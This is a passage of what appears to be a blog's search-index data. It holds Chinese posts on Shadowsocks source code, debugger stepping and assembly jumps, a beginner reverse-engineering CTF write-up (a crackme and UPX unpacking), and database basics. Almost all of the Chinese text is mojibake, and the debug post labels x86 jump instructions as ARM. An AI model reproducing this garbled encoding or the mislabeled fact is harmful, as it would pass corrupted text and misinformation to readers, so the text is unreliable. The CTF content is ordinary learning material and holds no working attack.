åœ¨main.pyä¸­å¯ä»¥ç›´æ¥ç”¨stringäº†ã€‚\nè€Œå¼•å…¥absolute_import å¯ä»¥å…ˆä»ç³»ç»Ÿåº“ä¸­å¼•ç”¨ã€‚\n /  python2ä¸­ï¼Œ/ä¸ºæ•´é™¤ï¼Œè€Œpython3ä¸­ï¼Œæ•´é™¤æ˜¯//ã€‚\n print  python2ä¸­ï¼Œprintæ˜¯ä¸€ä¸ªè¯­æ³•ç»“æ„ï¼Œè€Œpython3ä¸­ï¼Œprintæ˜¯ä¸€ä¸ªå†…ç½®å‡½æ•°ï¼Œæœ‰å¤šä¸ªå‚æ•°\nå³æ˜æ˜¾åœ°ï¼Œpython2ä¸­ï¼Œprint 'hello world'ï¼›è€Œåœ¨python3ä¸­ï¼Œprint('hello world')\n with  http://www.voidcn.com/article/p-wrgsfqdl-boq.html\npython2.5éœ€è¦å¼•å…¥çš„è¯­æ³•ï¼Œæ²¡æœ‰çœ‹åˆ°2å’Œ3æœ‰ä»€ä¹ˆåŒºåˆ«ï¼Œåº”è¯¥æ˜¯ä¸ºäº†å…¼å®¹æ‰€å¼•å…¥çš„ã€‚\nåœ¨stackoverflowçš„ä¸€ä¸ªé—®é¢˜é‡Œè¯´çš„å¾ˆæ¸…æ¥šäº†ï¼šhttps://stackoverflow.com/questions/3791903/which-python-version-needs-from-future-import-with-statement\nversion\u003c=2.4ä¸æ”¯æŒï¼Œversion2.5éœ€è¦è¿™ä¸ªimport with_statementï¼Œåœ¨version\u003e=2.6çš„æ—¶å€™ï¼Œpythonå·²ç»å°†withå†…åµŒè¿›å»äº†ã€‚\n Crypto openssl.py from ctypes import ...ï¼šctypesæ˜¯pythonå’ŒCçš„æ¡¥æ¢ï¼Œctypesæ˜¯pythonæ ‡å‡†åº“ä¹‹ä¸€ï¼Œé‡Œé¢å¼•å…¥äº†è®¸å¤šCçš„å‡½æ•°ä»¥åŠå˜é‡ç±»å‹\n https://www.cnblogs.com/gaowengang/p/7919219.html\n __all__ = ['cipher']è§„å®šäº†å¯¹å¤–æš´éœ²çš„æ¥å£\n https://www.cnblogs.com/wxlog/p/10566628.html\n ç”±æ­¤ç›´æ¥çœ‹åˆ°ä¸‹é¢çš„cipherï¼Œé‡Œé¢å®šä¹‰äº†ssçš„åŠ å¯†æ–¹æ³•\nè¿™ä¹Ÿå°±æ˜¯cryptoæ¨¡å—å¯¹å¤–æä¾›çš„æ‰€æœ‰åŠ å¯†æ–¹æ³•\ndef load_openssl()æ–¹æ³•ç”¨æ¥å¯»æ‰¾è¿è¡Œç³»ç»Ÿä¸­çš„opensslåº“\nå…¨å±€å˜é‡libcryptoç”¨æ¥å­˜æ”¾æ‰“å¼€çš„opensslå¯¹è±¡\nå®šä¹‰äº†ä¸€ä¸ªOpenSSLCryptoå¯¹è±¡ç”¨æ¥åŠ å¯†\nå‡½æ•°def run_method(method)ç”¨æ¥è°ƒç”¨è¯¥å¯¹è±¡è¿›è¡ŒåŠ è§£å¯†\nç„¶åä¸‹é¢æœ‰ä¸€å †çš„testå‡½æ•°\nrc4_md5.py ç›´æ¥è°ƒç”¨hashlibæ¨¡å—çš„md5è¿›è¡Œè¿ç®—ï¼Œæ²¡å•¥å¥½è¯´çš„\nsodium.py soudiumæ˜¯é’ çš„æ„æ€ï¼Œå¥½åƒä¹Ÿæ˜¯åœ¨è‹±è¯­ä¸­ä»£è¡¨ç€çº¯ç›\n https://blog.abyss.moe/archives/24/\nhttps://github.com/jedisct1/libsodium\n ä½†æ˜¯æŸ¥äº†ä¸‹libsodiumæ˜¯ä¸€ä¸ªæ–°çš„è½¯ä»¶åº“ï¼Œä¸ºäº†åŠ è§£å¯†ã€ç­¾åã€å“ˆå¸Œç­‰ã€‚æ˜¯ä¸€ä¸ªç°ä»£çš„å¯†ç åº“ï¼Œç€é‡äºç§»æ¤æ€§ã€å®‰å…¨æ€§ï¼Œæ˜¯NaCl(Networking and Cryptographt library)çš„ä¸€ä¸ªåˆ†æ”¯==\u003ehttp://nacl.cr.yp.to/\nè¿™é‡Œé¢ä¹Ÿæ˜¯å®ç°äº†ä¸‰ç§åŠ å¯†ï¼ˆéƒ½æ²¡å¬è¿‡ï¼Œå¾€åæœ‰æ—¶é—´å¯ä»¥äº†è§£ä¸€ä¸‹\nutil.py åŸºæœ¬åœ¨Cryptoæ–‡ä»¶å¤¹ä¸‹çš„æ‰€æœ‰æ–‡ä»¶åŸºæœ¬éƒ½å¼•ç”¨äº†è¿™ä¸ªæ¨¡å—\nè¿™æ¨¡å—æä¾›äº†â‘ æŸ¥æ‰¾dllåº“çš„å‡½æ•°ï¼šdef find_library_nt(name)ã€def find_library(possible_lib_names, search_symbol, library_name) â‘¡æµ‹è¯•åŠ è§£å¯†å‡½æ•°ï¼šdef run_cipher(cipher, decipher) â‘¢æ£€éªŒå¼•å…¥çš„åº“æ˜¯å¦å­˜åœ¨ï¼šdef test_find_library()\nå…¶mainå‡½æ•°ä¸»è¦æ˜¯ä¸ºäº†æ£€æµ‹æ˜¯å¦å¼•å…¥æ‰€æœ‰æ‰€éœ€çš„dllåº“ï¼Œæ‰€ä»¥å¼•å…¥è¿™ä¸ªæ¨¡å—å¯ç¡®ä¿å…¶ä»–ç¼–å†™åŠ å¯†çš„æ–‡ä»¶ä¸ä¼šå‡ºç°æ— æ³•è°ƒç”¨åº“çš„æƒ…å†µ\ntable.py å¥½åƒæ˜¯ä¸€ç§å•è¡¨æ›¿æ¢åŠ å¯†\n__init__.py ä¸€ä¸ªå¾ˆæ­£å¸¸çš„initæ–‡ä»¶ï¼Œè·Ÿcryptoçš„_init_.pyå·®ä¸å¤š\nasyncdns.py ä»æ–‡ä»¶åå°±å¯ä»¥çœ‹å‡ºï¼Œè¿™æ˜¯ä¸€ä¸ªå¼‚æ­¥çš„DNSæŸ¥è¯¢\nå…¶æ–‡ä»¶é‡Œæåˆ°äº†rfc1035ï¼Œå³DNSåè®®\n1 2 3 4 5 6 7 8 9  # è§„å®šäº†hostnameçš„æ ¼å¼ VALID_HOSTNAME = re.compile(br\"(?!-)[A-Z\\d\\-_]{1,63}(?\u003c!-)$\", re.IGNORECASE) # ä»¥åŠåé¢å¯¹hostnameçš„åˆ¤æ–­ def is_valid_hostname(hostname): if len(hostname) \u003e 255: return False if hostname[-1] == b'.': hostname = hostname[:-1] return all(VALID_HOSTNAME.match(x) for x in hostname.split(b'.'))   ä»¥ä¸‹æ˜¯è¯¥æ–‡ä»¶é‡Œå¯¹DNSåè®®å†™çš„ä¸€äº›é€šç”¨çš„å·¥å…·ç±»å‡½æ•°ç”¨äºè§£æåœ°å€ã€å›åº”ç­‰ï¼Œä»¥åŠæ„é€ åœ°å€å’Œè¯·æ±‚\n1 2 3 4 5 6 7  def build_address(address) def build_request(address, qtype) def parse_ip(addrtype, data, length, offset) def parse_name(data, offset) def parse_record(data, offset, question=False) def parse_header(data) def parse_response(data)   é‡‡ç”¨äº†class DNSResponse(object)è¿™ä¸ªç±»æ¥å­˜å‚¨DNSå›åº”ï¼Œå³ç›®æ ‡çš„hostnameã€è¯·æ±‚ã€ä»¥åŠanswer\nclass DNSResolver(object)ç±»å®ç°äº†ç®€å•çš„å¼‚æ­¥æŸ¥è¯¢DNSï¼Œå…¶ä¸­å¼‚æ­¥ç¼“å­˜é‡‡ç”¨äº†LRUCacheçš„æ–¹å¼ï¼ˆå…·ä½“å®ç°åœ¨lru_cache.pyä¸­ï¼‰\næ ¸å¿ƒå¤„ç†æ–¹æ³•ï¼š\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31  # åªæœ‰å¯è¯»äº‹ä»¶ def handle_event(self, sock, fd, event): # é˜²å¾¡æ€§ç¼–ç¨‹ï¼Œå®é™…ä¸Šæ˜¯ä¸ªæ— ç”¨çš„åˆ¤æ–­ if sock != self._sock: return if event \u0026 eventloop.POLL_ERR: # å½“é”™è¯¯å‘ç”Ÿæ—¶,é‡æ–°åˆå§‹åŒ–sock logging.error('dns socket err') # ä»äº‹ä»¶å¾ªç¯ä¸­ç§»é™¤ slef._sock self._loop.remove(self._sock) self._sock.close() # TODO when dns server is IPv6 # åˆå§‹åŒ–sock self._sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.SOL_UDP) self._sock.setblocking(False) # é‡æ–°åŠ å…¥äº‹ä»¶å¾ªç¯ self._loop.add(self._sock, eventloop.POLL_IN, self) else: ''' è¯»å–ä¸€ä¸ª UDP åŒ…ï¼Œå¹¶å–å‡ºå‰ 1024 ä¸ªå­—èŠ‚ æ³¨æ„ï¼šå¦‚æœä¸€ä¸ª UDP åŒ…è¶…è¿‡ 1024 å­—èŠ‚ï¼Œæ¯”å¦‚ï¼š2048 å­—èŠ‚ã€‚ ä¸€æ¬¡ recvfrom(1024) ä¹Ÿä¼šæ¶ˆè€—æ•´ä¸ª UDP åŒ…ã€‚è¿™é‡Œæ˜¯è®¤ä¸º DNS æŸ¥è¯¢è¿”å›çš„ UDP åŒ…éƒ½ä¸ä¼šè¶…è¿‡ 1024 å­—èŠ‚ã€‚ ''' data, addr = sock.recvfrom(1024) if addr[0] not in self._servers: logging.warn('received a packet other than our dns') return self._handle_data(data)   common.py è¯¥æ–‡ä»¶æä¾›äº†éƒ½æ˜¯äº›å·¥å…·ç±»çš„å‡½æ•°ï¼Œå¦‚byteså’Œstrçš„äº’ç›¸è½¬åŒ–ï¼ˆpython2ä¸­byteså±äºstrç±»ï¼‰ã€æ˜¯å¦æ˜¯ip\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  # ipåœ°å€è½¬æ¢å‡½æ•° # æ•°å€¼æ ¼å¼(numeric):å­˜å‚¨åœ°å€çš„äºŒè¿›åˆ¶æ ¼å¼ # ç‚¹åˆ†åè¿›åˆ¶:å°±æ˜¯æˆ‘ä»¬å¸¸è§çš„ip(192.168.1.1) def inet_pton(family, addr) # å°†ç‚¹åˆ†åè¿›åˆ¶çš„ipåœ°å€è½¬åŒ–ä¸ºç”¨äºç½‘ç»œä¼ è¾“çš„æ•°å€¼æ ¼å¼ def inet_ntop(family, ipstr)# å°†æ•°å€¼æ ¼å¼è½¬åŒ–ä¸ºç‚¹åˆ†åè¿›åˆ¶çš„ipåœ°å€æ ¼å¼ # å¤§æ¦‚æŸä¸ªç‰ˆæœ¬å‰çš„socketæ²¡æœ‰ipåœ°å€è½¬æ¢å‡½æ•° def patch_socket(): if not hasattr(socket, 'inet_pton'): socket.inet_pton = inet_pton if not hasattr(socket, 'inet_ntop'): socket.inet_ntop = inet_ntop def pack_addr(address) # æ‰“åŒ…åœ°å€ def parse_header(data) # è§£æsocket5å¤´éƒ¨ class IPNetwork(object) # åˆå§‹åŒ–ç½‘ç»œåˆ—è¡¨   daemon.py encrypt.py ","description":"","tags":["ssr","vpn","networks"],"title":"ShadowSocks-SourceCode-Learning","uri":"/posts/shadowsocks-sourcecode-learning/"},{"categories":["reverse"],"content":"Debug å…¥é—¨ åœ¨ä»¥å‰æ‰“ACMçš„æ—¶å€™ï¼Œdebugå…¨é printfå’Œå¤§è„‘è·‘ç¨‹åºï¼Œä½†æ˜¯ç°åœ¨åšé€†å‘çš„æ—¶å€™å‘ç°äº†debugçš„æ–°çŸ¥è¯†ã€‚\nå•æ­¥è°ƒè¯• ç°åœ¨åŸºæœ¬ä¸»æµçš„IDEéƒ½æä¾›äº†debugæ¨¡å¼ï¼Œå…¶ä¸­step intoï¼Œstep overï¼Œstep outæ˜¯ä¸‰ä¸ªä¸»æµçš„å‡½æ•°ï¼Œä¹Ÿæ˜¯ollydbgåŠ¨æ€è°ƒè¯•ä¸­æœ€é‡è¦çš„æ­¦å™¨ã€‚\nå…¶ä¸­æ¦‚å¿µå¦‚ä¸‹ï¼š\n  step intoï¼šStep to the next line excutedï¼ˆF7ï¼‰ å•æ­¥æ‰§è¡Œï¼Œé‡åˆ°å­å‡½æ•°å°±è¿›å…¥å¹¶ä¸”ç»§ç»­å•æ­¥æ‰§è¡Œï¼ˆç®€è€Œè¨€ä¹‹ï¼Œè¿›å…¥å­å‡½æ•°ï¼‰ï¼›\n  step overï¼šStep to the next line in this fileï¼ˆF8ï¼‰ åœ¨å•æ­¥æ‰§è¡Œæ—¶ï¼Œåœ¨å‡½æ•°å†…é‡åˆ°å­å‡½æ•°æ—¶ä¸ä¼šè¿›å…¥å­å‡½æ•°å†…å•æ­¥æ‰§è¡Œï¼Œè€Œæ˜¯å°†å­å‡½æ•°æ•´ä¸ªæ‰§è¡Œå®Œå†åœæ­¢ï¼Œä¹Ÿå°±æ˜¯æŠŠå­å‡½æ•°æ•´ä¸ªä½œä¸ºä¸€æ­¥ã€‚æœ‰ä¸€ç‚¹,ç»è¿‡æˆ‘ä»¬ç®€å•çš„è°ƒè¯•,åœ¨ä¸å­˜åœ¨å­å‡½æ•°çš„æƒ…å†µä¸‹æ˜¯å’Œstep intoæ•ˆæœä¸€æ ·çš„ï¼ˆç®€è€Œè¨€ä¹‹ï¼Œè¶Šè¿‡å­å‡½æ•°ï¼Œä½†å­å‡½æ•°ä¼šæ‰§è¡Œï¼‰ã€‚\n  step outï¼šStep to the first line executed after returning from this method å½“å•æ­¥æ‰§è¡Œåˆ°å­å‡½æ•°å†…æ—¶ï¼Œç”¨step outå°±å¯ä»¥æ‰§è¡Œå®Œå­å‡½æ•°ä½™ä¸‹éƒ¨åˆ†ï¼Œå¹¶è¿”å›åˆ°ä¸Šä¸€å±‚å‡½æ•°ã€‚\n  ç®€å•æ¥è¯´ï¼Œstep intoå°±æ˜¯é€è¡Œè¿è¡Œï¼Œå½“ç¢°åˆ°å‡½æ•°æ—¶ï¼Œä¼šè¿›å…¥å‡½æ•°å†…éƒ¨è¿›è¡Œæ‰§è¡Œï¼›è€Œstep overæ˜¯ç›´æ¥æ‰§è¡Œåˆ°æ–­ç‚¹å¤„ï¼Œå³ä¸ä¼šæ¯è¡Œéƒ½åœä¸‹æ¥ï¼›step out æ˜¯åœ¨æ‰§è¡Œåˆ°å­å‡½æ•°çš„ä»»æ„éƒ¨åˆ†æ—¶ï¼Œä½¿ç”¨è¯¥å‡½æ•°ä¼šç›´æ¥æ‰§è¡Œåˆ°è¯¥å‡½æ•°çš„è¿”å›è¯­å¥ï¼Œä½†æ˜¯å¦‚æœå­å‡½æ•°å‰©ä¸‹éƒ¨åˆ†ä»æœ‰æ–­ç‚¹ï¼Œåˆ™æ‰§è¡Œåˆ°æ–­ç‚¹éƒ¨åˆ†åœä¸‹ã€‚\nåœ¨çœ‹ã€Šæœ‰è¶£çš„äºŒè¿›åˆ¶ã€‹æ—¶ï¼Œå‘ç°äº†ä¸€ä¸ªç®€æ´çš„è§£é‡Šï¼š\n Step intoï¼šè·³å…¥ï¼šè°ƒç”¨å‡½æ•°æ—¶è¿›å…¥å‡½æ•°å†…éƒ¨ Step overï¼šè·³å‡ºï¼Œè°ƒç”¨å‡½æ•°æ—¶ä¸è¿›å…¥å‡½æ•°å†…éƒ¨ï¼Œå°†å‡½æ•°ä½œä¸ºä¸€æ¡æŒ‡ä»¤æ¥æ‰§è¡Œ  ï¼ˆå¯ä»¥ç›´æ¥åœ¨pycharmè¿›è¡Œå®éªŒï¼Œå®éªŒä»£ç å¦‚ä¸‹ï¼‰\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26  #!/usr/bin/env python # -*- coding:utf-8 -*- def add(a, b): c = a + b return c def divide(a, b): c = a / b return c def debug_test(): x = 8 y = 2 sum = add(x, y) d = divide(x, y) print(sum, d) return 0 if __name__ == '__main__': ans = debug_test() print(ans)   Ollydbg åœ¨ODä¸­ï¼š\n Step intoï¼šF7ï¼šæ‰§è¡Œä¸€å¥OP codeï¼Œè‹¥é‡åˆ°CALLï¼Œè¿›å…¥å‡½æ•°ä»£ç å†…éƒ¨ Step overï¼šF8ï¼šæ‰§è¡Œä¸€å¥OP codeï¼Œè‹¥é‡åˆ°CALLï¼Œä»…æ‰§è¡Œå‡½æ•°è‡ªèº«ï¼Œä¸è·Ÿéšè¿›å…¥  visual studioçš„è°ƒè¯•ï¼šhttps://blog.csdn.net/boylinux/article/details/7659759\nåœ¨visual studioé‡Œï¼ŒF11ä¸ºstep intoï¼ŒF10ä¸ºStep over\næ±‡ç¼–è¯­è¨€ï¼šè·³è½¬æŒ‡ä»¤  å‚è€ƒï¼šhttps://blog.csdn.net/weibo1230123/article/details/84236308\n ARMçš„è·³è½¬æŒ‡ä»¤å¦‚ä¸‹\n æ— æ¡ä»¶è·³è½¬: JMP; æ ¹æ® CXã€ECX å¯„å­˜å™¨çš„å€¼è·³è½¬: JCXZ(CX ä¸º 0 åˆ™è·³è½¬)ã€JECXZ(ECX ä¸º 0 åˆ™è·³è½¬); æ ¹æ® EFLAGS å¯„å­˜å™¨çš„æ ‡å¿—ä½è·³è½¬  æ ¹æ®æ ‡å¿—ä½è·³è½¬çš„æŒ‡ä»¤å¦‚ä¸‹ï¼š\nJE ;ç­‰äºåˆ™è·³è½¬ JNE ;ä¸ç­‰äºåˆ™è·³è½¬ JZ ;ä¸º 0 åˆ™è·³è½¬ JNZ ;ä¸ä¸º 0 åˆ™è·³è½¬ JS ;ä¸ºè´Ÿåˆ™è·³è½¬ JNS ;ä¸ä¸ºè´Ÿåˆ™è·³è½¬ JC ;è¿›ä½åˆ™è·³è½¬ JNC ;ä¸è¿›ä½åˆ™è·³è½¬ JO ;æº¢å‡ºåˆ™è·³è½¬ JNO ;ä¸æº¢å‡ºåˆ™è·³è½¬ JA ;æ— ç¬¦å·å¤§äºåˆ™è·³è½¬ JNA ;æ— ç¬¦å·ä¸å¤§äºåˆ™è·³è½¬ JAE ;æ— ç¬¦å·å¤§äºç­‰äºåˆ™è·³è½¬ JNAE ;æ— ç¬¦å·ä¸å¤§äºç­‰äºåˆ™è·³è½¬ JG ;æœ‰ç¬¦å·å¤§äºåˆ™è·³è½¬ JNG ;æœ‰ç¬¦å·ä¸å¤§äºåˆ™è·³è½¬ JGE ;æœ‰ç¬¦å·å¤§äºç­‰äºåˆ™è·³è½¬ JNGE ;æœ‰ç¬¦å·ä¸å¤§äºç­‰äºåˆ™è·³è½¬ JB ;æ— ç¬¦å·å°äºåˆ™è·³è½¬ JNB ;æ— ç¬¦å·ä¸å°äºåˆ™è·³è½¬ JBE ;æ— ç¬¦å·å°äºç­‰äºåˆ™è·³è½¬ JNBE ;æ— ç¬¦å·ä¸å°äºç­‰äºåˆ™è·³è½¬ JL ;æœ‰ç¬¦å·å°äºåˆ™è·³è½¬ JNL ;æœ‰ç¬¦å·ä¸å°äºåˆ™è·³è½¬ JLE ;æœ‰ç¬¦å·å°äºç­‰äºåˆ™è·³è½¬ JNLE ;æœ‰ç¬¦å·ä¸å°äºç­‰äºåˆ™è·³è½¬ JP ;å¥‡å¶ä½ç½®ä½åˆ™è·³è½¬ JNP ;å¥‡å¶ä½æ¸…é™¤åˆ™è·³è½¬ JPE ;å¥‡å¶ä½ç›¸ç­‰åˆ™è·³è½¬ JPO ;å¥‡å¶ä½ä¸ç­‰åˆ™è·³è½¬ ","description":"","tags":["debug","reverse"],"title":"Debug-Introduction","uri":"/posts/debug-introduction/"},{"categories":["reverse"],"content":"Reverse\u0026WriteUp å¼€å§‹å…¥å‘é€†å‘ï¼Œè¯·å¤šå¤šæŒ‡æ•™ï¼\næ”»é˜²ä¸–ç•Œ\u0026Cryptoæ–°æ‰‹ç»ƒä¹ åŒº 0x01 insanity  é¢˜ç›®æè¿°ï¼šèœé¸¡è§‰å¾—å‰é¢çš„é¢˜ç›®å¤ªéš¾äº†ï¼Œæ¥ä¸ªç®€å•çš„ç¼“ä¸€ä¸‹\n ä¸‹ä¸‹æ¥ä¸€ä¸ªæ–‡ä»¶ï¼Œæœ¬ç€å¥½å¥‡å¿ƒç›´æ¥ç”¨notepadæ‰“å¼€ï¼Œå°±çœ‹åˆ°äº†FLAGï¼š9447{This_is_a_flag}ï¼Ÿï¼Ÿï¼Ÿ\nåŸæœ¬æˆ‘åªæƒ³çœ‹çœ‹æ–‡ä»¶å¤´çš„ï¼Œæ²¡æƒ³åˆ°ç›´æ¥çœ‹åˆ°äº†FLAG\nçœ‹åˆ°æ–‡ä»¶å¤´å¾—çŸ¥ï¼Œè¿™æ˜¯ä¸€ä¸ªELFæ–‡ä»¶\næ‹–è¿›IDAé€†å‘ï¼Œç›´æ¥çœ‹mainå‡½æ•°ï¼Œæ²¡å•¥å‘ç°ï¼Œç„¶åF5å¾—æºç \nå¿ƒæƒ³ç€è¿™å“ªæœ‰å…³äºflagå¾—ä¿¡æ¯ï¼Œäºæ˜¯ç‚¹v4åˆ°å­—ç¬¦ä¸²åˆ°ï¼Œçœ‹åˆ°äº†é™æ€flagå­—ç¬¦ä¸²ï¼Œå¾—åˆ°flag\nçœ‹ç€è¿™ä¸ªå­—ç¬¦ä¸²ï¼Œåº”è¯¥æ˜¯ä¸€ä¸ªæŒºå¥½ç©å¾—æ¸¸æˆ\n0x02 Open-source  é¢˜ç›®æè¿°ï¼šèœé¸¡å­¦é€†å‘å­¦å¾—å¤´çš®å‘éº»ï¼Œç»ˆäºå®ƒæ‹¿åˆ°äº†ä¸€æ®µæºä»£ç \n å¦‚é¢˜ï¼Œç›´æ¥æ‹¿åˆ°æºç \n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35  #include \u003cstdio.h\u003e#include \u003cstring.h\u003e int main(int argc, char *argv[]) { if (argc != 4) { printf(\"what?\\n\"); exit(1); } unsigned int first = atoi(argv[1]); if (first != 0xcafe) { printf(\"you are wrong, sorry.\\n\"); exit(2); } unsigned int second = atoi(argv[2]); if (second % 5 == 3 || second % 17 != 8) { printf(\"ha, you won't get it!\\n\"); exit(3); } if (strcmp(\"h4cky0u\", argv[3])) { printf(\"so close, dude!\\n\"); exit(4); } printf(\"Brr wrrr grr\\n\"); unsigned int hash = first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207; printf(\"Get your key: \"); printf(\"%x\\n\", hash); return 0; }   æ¨æµ‹å¾—çŸ¥ï¼Œhashåº”è¯¥å°±æ˜¯æ‰€å¾—å­—ç¬¦ä¸²\nè¯¥å‡½æ•°æœ‰4ä¸ªåˆ¤æ–­ï¼Œå› ä¸ºæ¯ä¸ªåˆ¤æ–­éƒ½å’Œåé¢çš„hashè®¡ç®—æœ‰å…³ï¼Œå› æ­¤é˜…è¯»æ¯ä¸ªifåˆ¤æ–­\nç¬¬ä¸€ä¸ªåˆ¤æ–­æ˜¯å¦ä¸ºå››ä¸ªå‚æ•°ï¼Œç¬¬äºŒä¸ªåˆ¤æ–­firstæ˜¯å¦ä¸º0xcafeï¼Œå› ä¸ºfirstè¢«å¼ºè½¬ä¸ºintï¼Œå› æ­¤éœ€å°†åå…­è¿›åˆ¶è½¬åŒ–ä¸ºåè¿›åˆ¶ï¼Œè¿™è¾¹ç”¨pythonå·æ‡’ï¼Œç®—å‡ºä¸º51966ï¼Œç¬¬äºŒä¸ªåˆ¤æ–­è¦è¿‡ï¼Œå³æˆ–è¿ç®—ä¸¤è¾¹éƒ½éœ€è¦falseï¼Œå› æ­¤ secondæ»¡è¶³çš„æ¡ä»¶ä¸ºï¼šsecond %5 != 3 \u0026\u0026 second %17 == 8ï¼Œæœ€åä¸€ä¸ªåˆ¤æ–­å³æ˜¯c++çš„å­—ç¬¦ä¸²æ¯”è¾ƒï¼Œç›´æ¥è¾“å…¥h4cky0uã€‚\nç”¨gccå°†ç¨‹åºç¼–è¯‘ï¼Œå¾—åˆ°å¯æ‰§è¡Œæ–‡ä»¶ï¼Œè¿è¡Œä»¥ä¸Šç»“æœï¼Œå¾—åˆ°flagï¼šc0ffee\n0x03 simple-unpack  é¢˜ç›®æè¿°ï¼šèœé¸¡æ‹¿åˆ°äº†ä¸€ä¸ªè¢«åŠ å£³çš„äºŒè¿›åˆ¶æ–‡ä»¶\n è·å¾—ä¸€ä¸ªåŠ å£³çš„ELFæ–‡ä»¶ï¼Œæ‹–å…¥IDA64bité‡Œï¼Œæœç„¶æ²¡æ³•åˆ†æ\nå­¦ä¸€æ³¢è„±å£³\n å‚è€ƒï¼š\nhttps://bbs.ichunqiu.com/thread-22463-1-1.html?from=beef\nhttps://www.jianshu.com/p/0880bcb6fed6\n ç”¨DetectItEasyæŸ¥å‡ºè¿™æ˜¯upxå£³\n ä¸Š52pojie.cnæ‰¾ELF64è„±UPXå£³\nhttps://www.52pojie.cn/thread-1048649-1-1.html\nhttps://www.52pojie.cn/forum.php?mod=viewthread\u0026tid=730499\u0026page=1\n é€äº†ï¼Œä¹‹åè¡¥å……upxæ‰‹è„±\nå‘ç°å¯ä»¥ç”¨å‘½ä»¤è„±å£³ï¼Œç„¶åæ‹–å…¥IDAå³å¯çœ‹åˆ°æºç \n1  $ upx -d simple-unpack   ","description":"","tags":["ctf","reverse"],"title":"XCTF-adworld-reverse-wp","uri":"/posts/xctf-adworld-reverse-wp/"},{"categories":["database"],"content":"æ•°æ®åº“ç³»ç»Ÿæ¦‚å¿µ å¼•è¨€ DBMSå®šä¹‰ï¼šç”±ä¸€ä¸ªç›¸äº’å…³è”çš„æ•°æ®é›†åˆå’Œä¸€ç»„ç”¨ä»¥è®¿é—®è¿™äº›æ•°æ®çš„ç¨‹åºç»„æˆï¼Œè¿™ä¸ªæ•°æ®é›†åˆåŒåŸç§°ä½œæ•°æ®åº“(Database)ã€‚\nDBMSçš„ç›®æ ‡ï¼šæ–¹ä¾¿ã€é«˜æ•ˆåœ°å­˜å–æ•°æ®åº“ä¿¡æ¯\n å››ä¸ªåŸºæœ¬æ¦‚å¿µ  æ•°æ®ï¼ˆDataï¼‰ æ•°æ®åº“ï¼ˆDatabaseï¼‰ æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆDBMSï¼‰ æ•°æ®åº“ç³»ç»Ÿï¼ˆDBSï¼‰    æ•°æ® æ•°æ®ï¼ˆDataï¼‰æ˜¯æ•°æ®åº“ä¸­å­˜å‚¨çš„åŸºæœ¬å¯¹è±¡\næ•°æ®çš„å®šä¹‰ï¼šæè¿°äº‹ç‰©çš„ç¬¦å·è®°å½•\næ•°æ®çš„ç§ç±»ï¼šæ–‡å­—ã€å›¾å½¢ã€å›¾åƒã€å£°éŸ³\næ•°æ®çš„ç‰¹ç‚¹ï¼šæ•°æ®ä¸å…¶è¯­ä¹‰æ˜¯ä¸å¯åˆ†çš„\nï¼æ•°æ®çš„å½¢å¼ä¸èƒ½å®Œå…¨è¡¨è¾¾å…¶å†…å®¹\næ•°æ®ç»“æ„ é€»è¾‘ç»“æ„ï¼šæ•°æ®ä¹‹é—´å­˜åœ¨çš„é€»è¾‘å…³ç³»ï¼Œå¦‚è¡¨ã€æ ‘ã€å›¾ã€æ•°ç»„ç­‰\nç‰©ç†ç»“æ„ï¼šæ•°æ®åœ¨è®¡ç®—æœºå†…çš„å­˜å‚¨æ–¹å¼ï¼Œå¦‚é¡ºåºæ–¹å¼ã€é“¾æ¥æ–¹å¼\næ•°æ®åº“ æ•°æ®åº“ï¼ˆDatabaseï¼Œç®€ç§°DBï¼‰æ˜¯é•¿æœŸå‚¨å­˜åœ¨è®¡ç®—æœºå†…ã€æœ‰ç»„ç»‡çš„ã€å¯å…±äº«çš„å¤§é‡æ•°æ®é›†åˆ\næ•°æ®åº“çš„ç‰¹å¾  æ•°æ®æŒ‰ä¸€å®šçš„æ•°æ®æ¨¡å‹ç»„ç»‡ã€æè¿°å’Œå‚¨å­˜ å¯ä¸ºå„ç§ç”¨æˆ·å…±äº« å†—ä½™åº¦è¾ƒå° æ•°æ®ç‹¬ç«‹æ€§è¾ƒé«˜ æ˜“æ‰©å±•  æ•°æ®åº“ç®¡ç†ç³»ç»Ÿ æ•°æ®åº“ç®¡ç†ç³»ç»Ÿï¼ˆDatabase Management Systemï¼Œç®€ç§°DBMSï¼‰ç”±ä¸€ä¸ªç›¸äº’å…³è”çš„æ•°æ®çš„é›†åˆå’Œä¸€ç»„ç”¨ä»¥è®¿é—®è¿™äº›æ•°æ®çš„ç¨‹åºç»„æˆï¼Œæ˜¯ä½äºç”¨æˆ·ä¸æ“ä½œç³»ç»Ÿä¹‹é—´çš„ä¸€å±‚æ•°æ®ç®¡ç†è½¯ä»¶ã€‚\nç”¨é€”ï¼šç§‘å­¦åœ°ç»„ç»‡å’Œå­˜å‚¨æ•°æ®ã€é«˜æ•ˆåœ°è·å–å’Œç»´æŠ¤æ•°æ®\n æ•°æ®å®šä¹‰åŠŸèƒ½ï¼šæä¾›æ•°æ®å®šä¹‰è¯­è¨€ï¼ˆDDLï¼‰ï¼Œå®šä¹‰æ•°æ®åº“ä¸­çš„æ•°æ®å¯¹è±¡ æ•°æ®æ“ä½œåŠŸèƒ½ï¼šæä¾›æ•°æ®æ“çºµè¯­è¨€ï¼ˆDMLï¼‰ï¼Œæ“çºµæ•°æ®å®ç°å¯¹æ•°æ®åº“çš„åŸºæœ¬æ“ä½œï¼ˆå¢åˆ æ”¹æŸ¥ï¼‰ æ•°æ®åº“çš„è¿è¡Œç®¡ç†ï¼šä¿è¯æ•°æ®çš„å®‰å…¨æ€§ã€å®Œæ•´æ€§ï¼Œä¿è¯å¤šç”¨æˆ·å¯¹æ•°æ®çš„å¹¶å‘ä½¿ç”¨ï¼Œå‘ç”Ÿæ•…éšœåçš„ç³»ç»Ÿæ¢å¤ 